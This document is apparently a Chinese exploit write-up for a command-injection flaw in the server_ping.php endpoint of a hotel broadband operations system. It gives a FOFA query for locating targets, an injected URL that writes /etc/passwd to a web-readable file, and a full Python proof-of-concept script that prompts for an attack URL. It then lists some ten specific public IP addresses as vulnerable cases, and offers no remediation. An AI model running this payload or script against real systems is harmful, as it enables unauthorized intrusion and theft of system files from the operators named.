---
title: X运营系统 server_ping.php 远程命令执行漏洞
slug: "0122"
---
# X运营系统 server_ping.php 远程命令执行漏洞

漏洞描述

X运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行

漏洞影响

安美数字 酒店宽带运营系统

FOFA

"酒店宽带运营"

案例一：http://XXX:8088 

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964561930-083289e8-2337-4f5b-9973-3d9af0c69b5d.png)

构造url：

/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../pq.txt&id=1



![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964561948-bfd2c2b1-1942-48cc-9a2c-a215cd1f0513.png)

访问对应txt

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964563379-fb6a9f54-b0ce-4817-9831-b01352b3e3d1.png)

漏洞poc：

import base64

import requests

import random

import re

import json

import sys

from requests.packages.urllib3.exceptions import InsecureRequestWarning



def POC_1(target_url):

vuln_url = target_url + "/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../pq.txt&id=1"

headers = {

"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",

"Content-Type": "application/x-www-form-urlencoded",

}

try:

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)

print("\033[36m[o] 正在执行 cat /etc/passwd>../../pq.txt \033[0m".format(target_url))

if "parent" in response.text and response.status_code == 200:

vuln_url = target_url + "/pq.txt"

headers = {

"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",

"Content-Type": "application/x-www-form-urlencoded",

}

response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=10)

if "root:" in response.text:

print("\033[36m[o] 成功执行 cat /etc/passwd, 响应为:\n{} \033[0m".format(response.text))

else:

print("\033[31m[x] 请求失败:{} \033[0m")

else:

print("\033[31m[x] 请求失败 \033[0m")

except Exception as e:

print("\033[31m[x] 请求失败:{} \033[0m".format(e))

sys.exit(0)



\#

if __name__ == '__main__':

target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))

POC_1(target_url)





案例二：http://117.28.235.201:8008/

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964562687-cef3c574-3360-486c-b820-acd860f03e73.png)



案例三：https://111.203.241.131:7080/

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964563047-e8caeb7e-6039-4450-94ef-a2ca543c7f4b.png)



案例四：https://116.6.64.189:8088/

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964563052-6a765a38-0c32-44ea-9473-c4a8a0936bee.png)



案例五：https://60.16.5.129:7443/

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964563303-bd9d1a65-6f1c-4c5c-96e3-80f6cc25fa80.png)



案例六：https://220.172.105.162:7443/

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964563356-bd0eade6-2a5a-4982-b4d4-51a09c3b329c.png)



案例七：https://59.46.187.130:8088/

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964564134-4687c9d2-7516-4759-8018-03d7c2aea30f.png)





案例八：https://60.247.105.2:8088/

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964563957-82e560c1-af6e-469b-abf5-078efdcd291a.png)



案例九：https://58.249.124.4:7070/

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964564408-560e3165-5db6-4579-9b44-9e8905d4a103.png)



案例十：https://183.252.51.151:8088/

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964564498-a71827e3-8e4c-4d2e-aebf-7abb8190ff56.png)



案例十一：https://222.128.198.2:8080/

![img](/proxy/https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964564497-43dce0e1-b8d0-4c7d-b1a6-ee7f15346846.png)
